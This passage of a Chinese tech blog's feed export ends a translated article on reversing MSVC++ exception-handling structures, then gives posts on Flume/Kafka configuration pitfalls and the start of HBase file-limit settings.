class="line">    <span class="built_in">dd</span> -<span class="number">1</span></div><div class="line">    <span class="built_in">dd</span> offset func1_unwind_1tobase <span class="comment">; action</span></div><div class="line">    <span class="built_in">dd</span> <span class="number">0</span>                    <span class="comment">; toState</span></div><div class="line">    <span class="built_in">dd</span> <span class="number">0</span>                    <span class="comment">; action</span></div><div class="line">    <span class="built_in">dd</span> <span class="number">1</span>                    <span class="comment">; toState</span></div><div class="line">    <span class="built_in">dd</span> offset func1_unwind_2to1 <span class="comment">; action</span></div><div class="line">    <span class="built_in">dd</span> <span class="number">0</span>                    <span class="comment">; toState</span></div><div class="line">    <span class="built_in">dd</span> <span class="number">0</span>                    <span class="comment">; action</span></div><div class="line"></div><div class="line">func1_trymap</div><div class="line">    <span class="built_in">dd</span> <span class="number">1</span>                    <span class="comment">; tryLow</span></div><div class="line">    <span class="built_in">dd</span> <span class="number">2</span>                    <span class="comment">; tryHigh</span></div><div class="line">    <span class="built_in">dd</span> <span class="number">3</span>                    <span class="comment">; catchHigh</span></div><div class="line">    <span class="built_in">dd</span> <span class="number">2</span>                    <span class="comment">; nCatches</span></div><div class="line">    <span class="built_in">dd</span> offset func1_tryhandlers_0 <span class="comment">; pHandlerArray</span></div><div class="line">    <span class="built_in">dd</span> <span class="number">0</span></div><div class="line"></div><div class="line">func1_tryhandlers_0</div><div class="line">    <span class="built_in">dd</span> <span class="number">0</span>                    <span class="comment">; adjectives</span></div><div class="line">    <span class="built_in">dd</span> offset char * <span class="string">'RTTI Type Descriptor'</span> <span class="comment">; pType</span></div><div class="line">    <span class="built_in">dd</span> -<span class="number">1Ch</span>                 <span class="comment">; dispCatchObj</span></div><div class="line">    <span class="built_in">dd</span> offset func1_try0handler_pchar <span class="comment">; addressOfHandler</span></div><div class="line">    <span class="built_in">dd</span> <span class="number">0</span>                    <span class="comment">; adjectives</span></div><div class="line">    <span class="built_in">dd</span> <span class="number">0</span>                    <span class="comment">; pType</span></div><div class="line">    <span class="built_in">dd</span> <span class="number">0</span>                    <span class="comment">; dispCatchObj</span></div><div class="line">    <span class="built_in">dd</span> offset func1_try0handler_ellipsis <span class="comment">; addressOfHandler</span></div><div class="line"></div><div class="line">func1_unwind_1tobase proc <span class="built_in">near</span></div><div class="line">    a1 = <span class="built_in">byte</span> <span class="built_in">ptr</span> -<span class="number">14h</span></div><div class="line">    <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+a1]</div><div class="line">    <span class="keyword">call</span>    A::~A(void)</div><div class="line">    <span class="keyword">retn</span></div><div class="line">func1_unwind_1tobase endp</div><div class="line"></div><div class="line">func1_unwind_2to1 proc <span class="built_in">near</span></div><div class="line">    a2 = <span class="built_in">byte</span> <span class="built_in">ptr</span> -<span class="number">18h</span></div><div class="line">    <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+a2]</div><div class="line">    <span class="keyword">call</span>    A::~A(void)</div><div class="line">    <span class="keyword">retn</span></div><div class="line">func1_unwind_2to1 endp</div></pre></td></tr></table></figure>
<p>我们来看上述程序示例，<code>FuncInfo</code> 结构体中的 <code>maxState</code> 域值为 <code>4</code>，这表明<strong>栈展开映射表</strong>中有 <code>4</code> 个入口点，编号 <strong>0-3</strong> 。检查映射表，可以看到在栈展开过程中会执行的相应动作有以下 <code>4</code> 个：</p>
<blockquote>
<ul>
<li>state 3 -&gt; state 0 (NOP)</li>
<li>state 2 -&gt; state 1 (析构 <code>a2</code> )</li>
<li>state 1 -&gt; state 0 (NOP)</li>
<li>state 0 -&gt; state -1 (析构 <code>a1</code> )</li>
</ul>
</blockquote>
<p>再看 <code>try</code> 语句映射表，我们可以推断， <code>state 1</code> 和 <code>state2</code> 对应 <code>try</code> 语句块的执行逻辑，而 <code>sttate3</code> 对应 <code>catch</code> 语句块的执行逻辑。这样一来，<code>state 0 -&gt; 1</code> 的变化代表了 <code>try</code> 语句块的<strong>开始</strong>，<code>state 1 - &gt;0</code> 代表 <code>try</code> 语句块的<strong>结束</strong>。另外，我们还可以推断 <code>state -1 --&gt; 0</code> 代表创建 <code>a1</code>；<code>state 1 -&gt; 2</code> 代表创建 <code>a2</code>。具体的状态装换和相应的程序执行逻辑如下图所示：<br><img src="/imgs/14932976893461.gif" alt=""><br>看到这里可能会心生疑惑：<code>1 -&gt; 3</code> 那个箭头是从哪儿来的？其实这是在异常处理句柄内部发生的，我们从<strong>函数代码</strong>和 <code>FuncInfo</code> 结构体中都看不出来罢了。如果一个异常在 <code>try</code> 块内部被触发，异常处理句柄在调用相应的 <code>catch</code> 块之前，首先要做的就是把栈展开到 <code>tryLow</code> 那一层（上面例子中的 <code>state 1</code>），然后把状态值 <code>state</code> 设置为 <code>tryHigh+1</code>（即 <code>2+1=3</code>）。</p>
<p><code>try</code> 语句块对应 2 个 <code>catch</code> 句柄。第一个有一个 <code>catch</code> 的类型（ <code>char*</code> ），并且在栈 <code>-1Ch</code> 处获取到异常对象。第二个没有对应的异常类型，什么也不做，相当于忽略异常。两个句柄都会返回函数继续执行的地址，这个地址其实就紧随 <code>try</code> 块之后。这样我们试着还原一下该函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">func1</span> <span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    A a1;</div><div class="line">    a1.m1 = <span class="number">1</span>;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        A a2;</div><div class="line">        a2.m1 = <span class="number">2</span>;</div><div class="line">        <span class="keyword">if</span> (a1.m1 == a1.m2) <span class="keyword">throw</span> <span class="string">"abc"</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">catch</span>(<span class="keyword">char</span>* e)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Caught %s\n"</span>,e);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">catch</span>(...)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Caught ...\n"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"after try\n"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="附录-3-IDC-辅助脚本"><a href="#附录-3-IDC-辅助脚本" class="headerlink" title="附录 3: IDC 辅助脚本"></a>附录 3: IDC 辅助脚本</h2><p>我编写了一个 IDC 脚本用来辅助对 MSVC 程序的逆向分析。它会在整个程序中搜索 SEH/EH 的代码段，并且为所有相关的结构体和结构体元素添加注释。可以被注释的项有<strong>栈变量</strong>、<strong>异常处理句柄</strong>、<strong>异常类型</strong>及其他相关元素。它还能尝试修复 IDA 中误判的函数边界。该脚本的下载链接： <a href="http://www.openrce.org/downloads/details/196" target="_blank" rel="external">MS SEH/EH 逆向辅助脚本</a> 。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><h3 id="原文参考资料："><a href="#原文参考资料：" class="headerlink" title="原文参考资料："></a>原文参考资料：</h3><ol>
<li><a href="http://www.microsoft.com/msj/0197/exception/exception.aspx" target="_blank" rel="external">http://www.microsoft.com/msj/0197/exception/exception.aspx</a></li>
<li><a href="http://blogs.msdn.com/branbray/archive/2003/11/11/51012.aspx" target="_blank" rel="external">http://blogs.msdn.com/branbray/archive/2003/11/11/51012.aspx</a></li>
<li><a href="http://blogs.msdn.com/cbrumme/archive/2003/10/01/51524.aspx" target="_blank" rel="external">http://blogs.msdn.com/cbrumme/archive/2003/10/01/51524.aspx</a></li>
<li><a href="http://www.codeproject.com/cpp/exceptionhandler.asp" target="_blank" rel="external">http://www.codeproject.com/cpp/exceptionhandler.asp</a></li>
<li><a href="http://www.cs.arizona.edu/computer.help/policy/DIGITAL_unix/AA-PY8AC-TET1_html/callCH5.html" target="_blank" rel="external">http://www.cs.arizona.edu/computer.help/policy/DIGITAL_unix/AA-PY8AC-TET1_html/callCH5.html</a></li>
</ol>
<h3 id="翻译参考资料"><a href="#翻译参考资料" class="headerlink" title="翻译参考资料"></a>翻译参考资料</h3><ol>
<li><a href="http://www.cnblogs.com/samo/articles/3092895.html" target="_blank" rel="external">http://www.cnblogs.com/samo/articles/3092895.html</a></li>
<li><a href="http://www.cnblogs.com/Winston/archive/2009/04/19/1439184.html" target="_blank" rel="external">http://www.cnblogs.com/Winston/archive/2009/04/19/1439184.html</a></li>
<li><a href="https://msdn.microsoft.com/en-us/library/8dbf701c(v=vs.80).aspx" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/8dbf701c(v=vs.80).aspx</a></li>
<li><a href="http://www.nynaeve.net/?p=91" target="_blank" rel="external">http://www.nynaeve.net/?p=91</a></li>
<li><a href="http://www.cnblogs.com/awpatp/archive/2009/11/04/1595988.html" target="_blank" rel="external">http://www.cnblogs.com/awpatp/archive/2009/11/04/1595988.html</a></li>
<li><a href="https://en.wikibooks.org/wiki/C%2B%2B_Programming/RTTI" target="_blank" rel="external">https://en.wikibooks.org/wiki/C%2B%2B_Programming/RTTI</a></li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;原文： &lt;a href=&quot;http://www.openrce.org/articles/full_view/21&quot;&gt;http://www.openrce.org/articles/full_view/21&lt;/a&gt;  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;摘要&quot;&gt;&lt;a href=&quot;#摘要&quot; class=&quot;headerlink&quot; title=&quot;摘要&quot;&gt;&lt;/a&gt;摘要&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;MSVC++&lt;/strong&gt; 是编写 Win32 应用程序最常用的编译器，所以在 Win32 平台的逆向工作中，懂得其底层工作原理，对逆向工程师来说至关重要。掌握 VC++ 程序的底层原理之后，便能在逆向过程中精准、快速识别编译器生成的&lt;strong&gt;胶水代码&lt;/strong&gt;（Glue Code），这样可以让逆向工程师快速聚焦于二进制文件背后的真实程序和真实逻辑。另外，这对还原程序中高层次的结构（&lt;strong&gt;&lt;code&gt;译注&lt;/code&gt;&lt;/strong&gt;：面向对象的数据结构和程序组织结构、异常相关数据结构等）也有莫大帮助。  &lt;/p&gt;
&lt;p&gt;本文只是系列文章的上半部分（下半部分见： &lt;a href=&quot;http://jiayu0x.com/2017/04/30/reversing-msvcxx-exception-handling-2/&quot;&gt;(译)MSVC++ 逆向（二）—— 类、方法和 RTTI&lt;/a&gt;），主要讲栈展开、异常处理以及 MSVC 编译生成相关的数据结构。阅读本文需要有汇编、寄存器和调用约定相关的知识储备，当然，MSVC++ 的编程基础知识也是必要的。  &lt;/p&gt;
    
    </summary>
    
      <category term="security" scheme="http://jiayu0x.com/categories/security/"/>
    
    
      <category term="security" scheme="http://jiayu0x.com/tags/security/"/>
    
      <category term="re" scheme="http://jiayu0x.com/tags/re/"/>
    
      <category term="c++" scheme="http://jiayu0x.com/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>Flume 踩坑排雷记</title>
    <link href="http://jiayu0x.com/2016/12/27/flume-summary/"/>
    <id>http://jiayu0x.com/2016/12/27/flume-summary/</id>
    <published>2016-12-26T16:00:00.000Z</published>
    <updated>2017-05-04T13:48:22.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-背景"><a href="#1-背景" class="headerlink" title="1. 背景"></a>1. 背景</h2><p>最近一段时间在做安全大数据分析环境搭建以及初步的数据采集、录入工作，这个过程中用到了 <code>Hadoop+HBase+Flume+Kafka</code>这套大数据分析的工具。在数据分析环境架构中，<code>Flume-1.7.0</code> 主要用来收集各种来源、形式的数据，并把数据传给 <code>Kafka</code> 集群，由 <code>Kafka</code> 集群统一分发给 <code>HBase</code> 集群。</p>
<p>用 <code>Flume</code> ，主要用到的 <strong><code>Source</code></strong> 是 <code>spooldir source</code> 和 <code>http-json source</code>，<strong><code>Sink</code></strong> 就主要是 <code>Kafka Sink</code>，配置非常灵活、功能也很强大。但在使用的过程中踩了不少坑，撰文记录一下比较重要的几个。</p>
<blockquote>
<p><strong>NOTE:</strong><br><code>Flume-ng</code> 的<code>Agent</code> 由三部分组成：<code>Source</code>/<code>Channel</code>/<code>Sink</code>，<code>Source</code> 相当于数据录入源，是 <strong>生产者</strong> 的角色； <code>Channel</code> 相当于数据传输通道；<code>Sink</code> 相当于数据接收端，是<strong>消费者</strong>的角色。在 <code>Flume-ng</code> 中，数据流向是 <code>Source--&gt;Channel--&gt;Sink</code>。</p>
</blockquote>
<h2 id="2-kafka-Sink-配置坑"><a href="#2-kafka-Sink-配置坑" class="headerlink" title="2. kafka Sink 配置坑"></a>2. <code>kafka</code> Sink 配置坑</h2><h3 id="2-1-LEADER-NOT-AVAILABLE-Error"><a href="#2-1-LEADER-NOT-AVAILABLE-Error" class="headerlink" title="2.1 LEADER_NOT_AVAILABLE Error"></a>2.1 <code>LEADER_NOT_AVAILABLE</code> Error</h3><a id="more"></a>
<p><code>Kafka Sink</code> ，顾名思义，即把 <code>Kafka</code> （集群或单个服务器）当做 <code>Flume</code> 的数据接收端（消费者），其中有一个配置项是配置 <code>Kafka</code> 的服务器：<br><figure class="highlight roboconf"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">AGENT_NAME.sinks.malwrK.kafka.bootstrap.servers = serv1:PORT[,serv2:PORT,serv3:PORT...]</div></pre></td></tr></table></figure></p>
<p>这项配置中，如果只指定单个的 <code>Kafka</code> 服务器地址，<code>Flume Agent</code> 会正常运行，但如果把 <code>Kafka</code> 集群里的多个服务器地址都写上，并且<code>Kafka</code>的默认配置不修改，则会报以下错误：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">WARN Error while fetching metadata with correlation id 39 : &#123;4-3-16-topic1=LEADER_NOT_AVAILABLE&#125;</div></pre></td></tr></table></figure></p>
<p>并且数据无法正常发送到 <code>Kafka</code> 集群。该错误的意思是集群中的服务器，没有一个可用的 <strong>LEADER</strong>，导致数据无法正常 Fetch。那么解决方法也很简单，在 <code>Kafka</code> 集群的每个服务器 <code>server.properties</code> 配置文件中，开启（取消注释）以下配置，并把配置项的值改成统一指定的一台 <code>Kafka</code> 服务器做 <strong>LEADER</strong>：<br><figure class="highlight roboconf"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">advertised.listeners=PLAINTEXT://your.host.name:9092</div></pre></td></tr></table></figure></p>
<h3 id="2-2-useFlumeEventFormat-导致的-Flume-Event-Headers-乱码"><a href="#2-2-useFlumeEventFormat-导致的-Flume-Event-Headers-乱码" class="headerlink" title="2.2 useFlumeEventFormat 导致的 Flume Event Headers 乱码"></a>2.2 <code>useFlumeEventFormat</code> 导致的 Flume Event Headers 乱码</h3><p><code>Kafka Sink</code> 中有这么一个配置项 <code>useFlumeEventFormat</code>，此配置默认关闭，官方解释如下；</p>
<blockquote>
<p>By default events are put as bytes onto the Kafka topic directly from the event body. Set to true to store events as the Flume Avro binary format. Used in conjunction with the same property on the KafkaSource or with the parseAsFlumeEvent property on the Kafka Channel this will preserve any Flume headers for the producing side.</p>
</blockquote>
<p>如果设置此项为 <code>true</code>，<code>Kafka Sink</code> 则会把数据按照标准的 Flume Event 格式（即<code>Headers</code>域和<code>body</code>域结合的数据结构）发送。Flume Event 中的 <code>Headers</code> 域通常是一些附加字段，可以是时间戳（比如时间戳拦截器指定的时间戳）、文件名（比如 <code>spooldir</code> Source 开启的 <code>fileHeader = true</code>）等信息。但是 <code>1.7.0</code> 版本的 Flume 一旦开启此配置，会导致 <code>Headers</code> 域里面的信息乱码，如下图所示：<br><img src="/imgs/1482809681554.png" alt="Alt text"></p>
<p>这可能是这个版本 Flume 的一个 Bug，原因未明，查各种资料也没查到，就剩翻源码了……</p>
<h2 id="3-spooldir-Source-的配置技巧"><a href="#3-spooldir-Source-的配置技巧" class="headerlink" title="3. spooldir Source 的配置技巧"></a>3. <code>spooldir</code> Source 的配置技巧</h2><p><code>spooldir</code> Source 的作用，是监控一个特定目录下的文件，一旦有新文件放入这个特定的目录，Flume 的 Agent 就会把整个文件的内容 <strong>逐行</strong> 读取，通过指定的 <code>Channel</code> 发送到指定的 <code>Sink</code>，并把已处理过的文件默认以<code>.COMPLETED</code> 后缀标记为已处理，或者直接删除。</p>
<p>早期版本的 Flume 中， <code>spooldir</code> Source 监控指定目录时，是不能监控子目录的，但我们用的 <code>1.7.0</code> 版本，提供了一个配置项可以监控指定目录下的子目录：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">recursiveDirectorySearch = true</div></pre></td></tr></table></figure></p>
<p><code>spooldir</code> Source 的默认配置，用来监控一个目录下的同类型文件足够了，但是我们的需求有点复杂：首先，我们这个监控目录下的文件不是同一类型（尽管文件的内容结构类似，比如都是 IP 库，每行一个 IP）；其次，我们的文件是一次性下载的，不是逐行写入的；最后，我们需要在逐行传输每个文件的时候，携带上文件所述的类型、文件生成的时间标记。</p>
<p>这个需求有两种处理方法：</p>
<ol>
<li>每次下载一个文件，就用脚本自动化处理一下，把文件类型和时间戳加入文件的每一行中；</li>
<li>寄希望与 Flume，看 Flume 传输数据的时候能不能对数据进行一些自定义的修改——不修改本地文件，只在 Flume 传输文件的过程中修改一下。</li>
</ol>
<p>无疑第一个工作量不小，而且比较耗费计算资源。去翻了下 Flume 的 用户手册 <code>spooldir</code> Source 部分，发现有一个配置项可以方便我们选第2中方法达成目标：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">fileHeader = true</div><div class="line"># 或者</div><div class="line">basenameHeader = true</div></pre></td></tr></table></figure></p>
<p>开启 <code>fileHeader</code> 会在 Flume 传输数据的时候，把数据所属文件的绝对路径附在每一行数据之前；开启 <code>basenameHeader</code> 会在 Flume 传输数据的时候，把数据所属文件的文件名附在每一行数据之前。</p>
<p>这样，我们把数据文件的文件名修改为 <code>type-timestamp-</code>的形式即可。比如我们生成一个名为 <code>bambenek_c2-1478553609-</code> 的文件，该文件里有数万行IP数据，那么 Flume 传输该数据的形式如下图所示：<br><img src="/imgs/1482235249267.png" alt="Alt text"></p>
<p>这样就满足了我们的需求，后台接收到数据之后，只需用 <strong><code>-</code></strong> 字符把每行数据 Split 成 3 个部分（文件名、时间戳、数据内容）即可。</p>
<blockquote>
<p><strong>NOTE:</strong><br>其实，Flume 中还有功能更强大的 <code>Interceptors</code>（拦截器），可以对其处理的数据进行更细粒度、方式更灵活的修改。参考 <a href="https://flume.apache.org/FlumeUserGuide.html#flume-interceptors" target="_blank" rel="external">Flume Interceptors</a></p>
</blockquote>
<h2 id="4-http-Source-的坑"><a href="#4-http-Source-的坑" class="headerlink" title="4.http Source 的坑"></a>4.<code>http</code> Source 的坑</h2><p>这是最大的一个坑，不过踩的有点冤，如果把官方用户手册看仔细，并对 JSON 的数据格式有准确的理解，应该就不会掉坑了。</p>
<p>Flume 的 <code>http</code> Source，默认数据源的形式是接收第三方用 HTTP POST 方法发送过来的 JSON 格式的数据（默认的 Source 处理类 <code>JSONHandler</code> ，也可以自定义实现其他的数据处理类）。比如我们的应用场景，从网上抓取的威胁情报信息，Python 写的爬虫程序处理好之后，不用存库，直接整理成 JSON 格式，然后 POST 给 Flume 的 Agent 即可。</p>
<p>但是，Flume 的 <code>http</code> Source 对这种方式的 JSON 数据格式有严格的要求，如果 JSON 数据格式不符合要求，POST 过去数据就会发现服务端报错，如下图红框里的 JSON 数据，完全符合 JSON 数据格式规范，但 POST 请求发送之后就会收到 <code>Request has invalid JSON Syntax.</code> 的错误提示：<br><img src="/imgs/1482235307436.png" alt="Alt text"></p>
<p>原因是什么？扒一下 Flume 的官方用户手册（<a href="https://flume.apache.org/FlumeUserGuide.html#jsonhandler" target="_blank" rel="external">http source–&gt; JSONHandler</a>）看一下：</p>
<blockquote>
<p>A handler is provided out of the box which can handle <strong>events represented in JSON format</strong>, and supports UTF-8, UTF-16 and UTF-32 character sets. The handler accepts an <strong>array of events</strong> (even if there is only one event, the event has to be sent in an array) and converts them to a Flume event based on the encoding specified in the request. If no encoding is specified, UTF-8 is assumed</p>
</blockquote>
<p>注意加粗部分，意思是该类（<code>JSONHandler</code>）处理的是 JSON 格式的 Flume Event<strong>s</strong>（可以一次传输多个 <code>Flume Events</code>，即多组数据记录），接收的 JSON 数据必须是 <strong>array of events</strong>，即使只发送一个 <code>Flume Event</code>，也得按照 JSON Array 的格式发送。</p>
<p>什么意思？这里还要插播一下 JSON 数据格式规范。JSON 的数据格式里，基本元素是 <strong>值</strong> 或者 <strong>键值对</strong>，JSON 数据的值可以是以下几种：</p>
<ul>
<li>数字（<code>bunber</code>，整数或浮点数）</li>
<li>字符串（<code>string</code>，在双引号中）</li>
<li>逻辑值（<code>bool</code>，true 或 false）</li>
<li>对象（<code>object</code>，在花括号中，比如<code>{&quot;k1&quot;:&quot;v1&quot;,&quot;k2&quot;:&quot;v2&quot;}</code>）</li>
<li>数组（<code>array</code>，在方括号中，比如<code>[{&quot;k1&quot;:&quot;v1&quot;,},{&quot;k2&quot;:int_v2,&quot;k3&quot;:&quot;v3&quot;}]</code>）</li>
<li>null</li>
</ul>
<p>并且官方给出了 JSON 示例：<br><figure class="highlight json"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">[&#123;</div><div class="line">    <span class="attr">"headers"</span> : &#123;</div><div class="line">        <span class="attr">"timestamp"</span> : <span class="string">"434324343"</span>,</div><div class="line">        <span class="attr">"host"</span> : <span class="string">"random_host.example.com"</span></div><div class="line">    &#125;,</div><div class="line">    <span class="attr">"body"</span> : <span class="string">"random_body"</span></div><div class="line"> &#125;,</div><div class="line"> &#123;</div><div class="line">    <span class="attr">"headers"</span> : &#123;</div><div class="line">        <span class="attr">"namenode"</span> : <span class="string">"namenode.example.com"</span>,</div><div class="line">        <span class="attr">"datanode"</span> : <span class="string">"random_datanode.example.com"</span></div><div class="line">    &#125;,</div><div class="line">    <span class="attr">"body"</span> : <span class="string">"really_random_body"</span></div><div class="line"> &#125;]</div></pre></td></tr></table></figure></p>
<p>但 Flume 官方手册没说明的是，Flume 的 Event 只有两部分组成：<strong>headers</strong> 和 <strong>body</strong>，所以传输的 JSON Array 里的 Flume Event，每个 Event 也只可以包括 <strong>headers</strong> 和 <strong>body</strong> 两部分，而且 <strong><code>headers</code>的值是 <code>JSON 对象（object）</code>，而<code>body</code>的值只能是 <code>JSON 字符串（string）</code>，不能是其他 JSON 值类型</strong>，比如下图所示的 JSON 形式，对 Flume 来说算是合法的<br><img src="/imgs/1482235288060.png" alt="Alt text"></p>
<p>另外，为了方便 Python 编程，附上 Python 中的 <code>json</code> 库里，Python 数据类型跟 JSON 值类型的对应关系表（参考： <a href="https://docs.python.org/2/library/json.html#json.JSONEncoder" target="_blank" rel="external">Python json.JSONEncoder()</a>）：<br><img src="/imgs/1482245906334.png" alt="Alt text"></p>
<p>最后总结一下，传给 flume HTTP Source 的 JSON 数据：</p>
<ol>
<li>必须是 Array 形式（用方括号括起来），即使 Array 里只有 1 个元素（每个元素到了 Flume 那儿就代表一个 Event），在 Python 里就要用 <code>dict</code> 外面嵌套 <code>list</code> 或者 <code>tuple</code> 生成 JSON Array；</li>
<li>JSON Array 里每个元素必须由 <code>headers</code> 和 <code>body</code> 两个 field 构成;</li>
<li>JSON Array 中元素的 <code>headers</code> 的值是 <code>JSON Object</code>(具体可以自定义)，<code>body</code> 的值必须是字串（JSON String），而不能是其他形式（JSON <code>Object/JSON Array</code>等，对应 Python 中的 <code>dict/list/tuple</code> 等）。</li>
</ol>
<h2 id="5-参考资料："><a href="#5-参考资料：" class="headerlink" title="5. 参考资料："></a>5. 参考资料：</h2><ol>
<li><a href="http://stackoverflow.com/questions/35788697/leader-not-available-kafka-in-console-producer" target="_blank" rel="external">http://stackoverflow.com/questions/35788697/leader-not-available-kafka-in-console-producer</a></li>
<li><a href="https://flume.apache.org/FlumeUserGuide.html" target="_blank" rel="external">https://flume.apache.org/FlumeUserGuide.html</a></li>
<li><a href="https://docs.python.org/2/library/json.html" target="_blank" rel="external">https://docs.python.org/2/library/json.html</a></li>
<li><a href="https://docs.python.org/2/library/json.html#py-to-json-table" target="_blank" rel="external">https://docs.python.org/2/library/json.html#py-to-json-table</a></li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1-背景&quot;&gt;&lt;a href=&quot;#1-背景&quot; class=&quot;headerlink&quot; title=&quot;1. 背景&quot;&gt;&lt;/a&gt;1. 背景&lt;/h2&gt;&lt;p&gt;最近一段时间在做安全大数据分析环境搭建以及初步的数据采集、录入工作，这个过程中用到了 &lt;code&gt;Hadoop+HBase+Flume+Kafka&lt;/code&gt;这套大数据分析的工具。在数据分析环境架构中，&lt;code&gt;Flume-1.7.0&lt;/code&gt; 主要用来收集各种来源、形式的数据，并把数据传给 &lt;code&gt;Kafka&lt;/code&gt; 集群，由 &lt;code&gt;Kafka&lt;/code&gt; 集群统一分发给 &lt;code&gt;HBase&lt;/code&gt; 集群。&lt;/p&gt;
&lt;p&gt;用 &lt;code&gt;Flume&lt;/code&gt; ，主要用到的 &lt;strong&gt;&lt;code&gt;Source&lt;/code&gt;&lt;/strong&gt; 是 &lt;code&gt;spooldir source&lt;/code&gt; 和 &lt;code&gt;http-json source&lt;/code&gt;，&lt;strong&gt;&lt;code&gt;Sink&lt;/code&gt;&lt;/strong&gt; 就主要是 &lt;code&gt;Kafka Sink&lt;/code&gt;，配置非常灵活、功能也很强大。但在使用的过程中踩了不少坑，撰文记录一下比较重要的几个。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;NOTE:&lt;/strong&gt;&lt;br&gt;&lt;code&gt;Flume-ng&lt;/code&gt; 的&lt;code&gt;Agent&lt;/code&gt; 由三部分组成：&lt;code&gt;Source&lt;/code&gt;/&lt;code&gt;Channel&lt;/code&gt;/&lt;code&gt;Sink&lt;/code&gt;，&lt;code&gt;Source&lt;/code&gt; 相当于数据录入源，是 &lt;strong&gt;生产者&lt;/strong&gt; 的角色； &lt;code&gt;Channel&lt;/code&gt; 相当于数据传输通道；&lt;code&gt;Sink&lt;/code&gt; 相当于数据接收端，是&lt;strong&gt;消费者&lt;/strong&gt;的角色。在 &lt;code&gt;Flume-ng&lt;/code&gt; 中，数据流向是 &lt;code&gt;Source--&amp;gt;Channel--&amp;gt;Sink&lt;/code&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;2-kafka-Sink-配置坑&quot;&gt;&lt;a href=&quot;#2-kafka-Sink-配置坑&quot; class=&quot;headerlink&quot; title=&quot;2. kafka Sink 配置坑&quot;&gt;&lt;/a&gt;2. &lt;code&gt;kafka&lt;/code&gt; Sink 配置坑&lt;/h2&gt;&lt;h3 id=&quot;2-1-LEADER-NOT-AVAILABLE-Error&quot;&gt;&lt;a href=&quot;#2-1-LEADER-NOT-AVAILABLE-Error&quot; class=&quot;headerlink&quot; title=&quot;2.1 LEADER_NOT_AVAILABLE Error&quot;&gt;&lt;/a&gt;2.1 &lt;code&gt;LEADER_NOT_AVAILABLE&lt;/code&gt; Error&lt;/h3&gt;
    
    </summary>
    
      <category term="bigdata" scheme="http://jiayu0x.com/categories/bigdata/"/>
    
    
      <category term="flume" scheme="http://jiayu0x.com/tags/flume/"/>
    
      <category term="bigdata" scheme="http://jiayu0x.com/tags/bigdata/"/>
    
  </entry>
  
  <entry>
    <title>HBase 一些需要注意的点</title>
    <link href="http://jiayu0x.com/2016/11/21/hbase-notice/"/>
    <id>http://jiayu0x.com/2016/11/21/hbase-notice/</id>
    <published>2016-11-20T16:00:00.000Z</published>
    <updated>2017-04-03T15:20:22.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="同时打开的文件和进程数量限制-ulimit"><a href="#同时打开的文件和进程数量限制-ulimit" class="headerlink" title="同时打开的文件和进程数量限制 (ulimit)"></a>同时打开的文件和进程数量限制 (ulimit)</h3><blockquote>
<p><strong>参考</strong>:<br><a href="http://hbase.apache.org/book.html#basic.prerequisites" target="_blank" rel="external">http://hbase.apache.org/book.html#basic.prerequisites</a></p>
</blockquote>
<p>Linux 系统默认的 <code>ulimit -n</code> 结果为 <code>1024</code> ，这个数量对 HBase 来说有点低，如果 HBase 打开的文件句柄数量超过这个限制，会报以下形式的错误：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">2010-04-06 03:04:37,542 INFO org.apache.hadoop.hdfs.DFSClient: Exception increateBlockOutputStream java.io.EOFException</div><div class="line">2010-04-06 03:04:37,542 INFO org.apache.hadoop.hdfs.DFSClient: Abandoning block blk_-6935524980745310745_1391901</div></pre></td></tr></table></figure></p>
<p>官方建议这个数值最少 <code>10000</code>，不过最好是 2 幂或可以跟 2 的幂有简单的换算关系，比如 <code>10240</code>。</p>
<a id="more"></a> 
